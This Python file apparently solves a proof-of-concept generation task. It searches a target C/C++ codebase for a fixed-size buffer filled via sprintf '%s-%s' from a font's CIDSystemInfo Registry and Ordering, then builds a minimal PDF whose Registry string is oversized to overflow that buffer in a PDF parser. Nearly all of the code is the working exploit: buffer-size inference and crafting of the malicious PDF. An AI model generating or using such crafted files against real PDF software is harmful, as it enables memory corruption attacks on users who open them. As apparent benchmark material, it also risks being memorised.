import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def __init__(self) -> None:
        self._max_file_bytes = 2_000_000

    def solve(self, src_path: str) -> bytes:
        buf_size = self._infer_fallback_buffer_size(src_path)
        if buf_size is None or buf_size <= 0:
            reg_len = 80000
        else:
            reg_len = max(64, buf_size + 32)

        registry = b"A" * reg_len
        ordering = b"B"
        return self._build_pdf_poc(registry, ordering)

    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.lower().endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read(self._max_file_bytes)
                    except OSError:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    yield p, text
            return

        try:
            if not tarfile.is_tarfile(src_path):
                return
        except OSError:
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if not name.lower().endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(self._max_file_bytes)
                    except Exception:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    yield name, text
        except Exception:
            return

    def _infer_fallback_buffer_size(self, src_path: str) -> Optional[int]:
        define_re = re.compile(r'^[ \t]*#[ \t]*define[ \t]+([A-Za-z_]\w*)[ \t]+(\d+)\b', re.M)
        const_re = re.compile(r'^[ \t]*(?:static[ \t]+)?(?:const[ \t]+)?(?:int|unsigned[ \t]+int|size_t)[ \t]+([A-Za-z_]\w*)[ \t]*=[ \t]*(\d+)[ \t]*;', re.M)

        defines: Dict[str, int] = {}
        relevant: List[Tuple[str, str]] = []

        for name, text in self._iter_source_texts(src_path):
            for m in define_re.finditer(text):
                k, v = m.group(1), m.group(2)
                try:
                    defines[k] = int(v)
                except Exception:
                    pass
            for m in const_re.finditer(text):
                k, v = m.group(1), m.group(2)
                try:
                    defines[k] = int(v)
                except Exception:
                    pass

            low = text.lower()
            if ("cid" in low and "systeminfo" in low and "registry" in low and "ordering" in low) or (
                "registry" in low and "ordering" in low and "%s-%s" in text
            ):
                relevant.append((name, text))

        candidates: List[int] = []
        for _, text in relevant:
            candidates.extend(self._extract_buffer_candidates(text, defines))

        candidates = [c for c in candidates if 8 <= c <= 5_000_000]
        if not candidates:
            return None
        candidates.sort()
        for c in candidates:
            if c <= 4096:
                return c
        return candidates[0]

    def _resolve_size_token(self, tok: str, defines: Dict[str, int]) -> Optional[int]:
        tok = tok.strip()
        if tok.isdigit():
            try:
                return int(tok)
            except Exception:
                return None
        if tok in defines:
            return defines[tok]
        return None

    def _extract_buffer_candidates(self, text: str, defines: Dict[str, int]) -> List[int]:
        decl_tmpl = r'\b(?:char|signed\s+char|unsigned\s+char|fz_char)\s+{var}\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]'
        sprintf_re = re.compile(
            r'\b(?:sprint[fF]|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"[^"]*%s[^"]*-[^"]*%s[^"]*"\s*,',
            re.S,
        )
        strcat_dash_re = re.compile(
            r'\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*"-"\s*\)',
            re.S,
        )

        any_decl_re = re.compile(r'\b(?:char|signed\s+char|unsigned\s+char|fz_char)\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]')

        cands: List[int] = []

        for m in sprintf_re.finditer(text):
            var = m.group(1)
            pos = m.start()
            lookback = text[max(0, pos - 12000):pos]
            dv = re.compile(decl_tmpl.format(var=re.escape(var)))
            dm = None
            for dm2 in dv.finditer(lookback):
                dm = dm2
            if dm is not None:
                sz = self._resolve_size_token(dm.group(1), defines)
                if sz is not None:
                    cands.append(sz)

        for m in strcat_dash_re.finditer(text):
            var = m.group(1)
            pos = m.start()
            lookback = text[max(0, pos - 12000):pos]
            dv = re.compile(decl_tmpl.format(var=re.escape(var)))
            dm = None
            for dm2 in dv.finditer(lookback):
                dm = dm2
            if dm is not None:
                sz = self._resolve_size_token(dm.group(1), defines)
                if sz is not None:
                    cands.append(sz)

        if cands:
            return cands

        low = text.lower()
        if "registry" not in low or "ordering" not in low:
            return []

        fmt_idx = text.find('"%s-%s"')
        if fmt_idx != -1:
            ctx = text[max(0, fmt_idx - 8000):fmt_idx + 2000]
            last_decl = None
            for d in any_decl_re.finditer(ctx):
                last_decl = d
            if last_decl is not None:
                sz = self._resolve_size_token(last_decl.group(2), defines)
                if sz is not None:
                    cands.append(sz)

        return cands

    def _build_pdf_poc(self, registry: bytes, ordering: bytes) -> bytes:
        header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

        contents = b"BT /F1 1 Tf 0 0 Td (A) Tj ET"
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 1 1] /Contents 5 0 R >>\nendobj\n"
        obj4 = b"4 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /F1Base /Encoding /Identity-H /DescendantFonts [6 0 R] >>\nendobj\n"
        obj5 = (
            b"5 0 obj\n<< /Length " + str(len(contents)).encode("ascii") + b" >>\nstream\n" + contents + b"\nendstream\nendobj\n"
        )

        cid_sysinfo = b"<< /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >>"
        obj6 = (
            b"6 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F1Base /CIDSystemInfo "
            + cid_sysinfo
            + b" /FontDescriptor 7 0 R /DW 1000 /W [0 [1000]] /CIDToGIDMap /Identity >>\nendobj\n"
        )
        obj7 = b"7 0 obj\n<< /Type /FontDescriptor /FontName /F1Base /Flags 4 /FontBBox [0 0 1 1] /ItalicAngle 0 /Ascent 1 /Descent 0 /CapHeight 1 /StemV 1 >>\nendobj\n"

        objs = [obj1, obj2, obj3, obj4, obj5, obj6, obj7]

        offsets = [0]
        cur = len(header)
        for o in objs:
            offsets.append(cur)
            cur += len(o)

        xref_off = cur
        xref_entries = [b"0000000000 65535 f \n"]
        for i in range(1, 8):
            xref_entries.append(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))

        xref = b"xref\n0 8\n" + b"".join(xref_entries)
        trailer = (
            b"trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n"
            + str(xref_off).encode("ascii")
            + b"\n%%EOF\n"
        )

        return header + b"".join(objs) + xref + trailer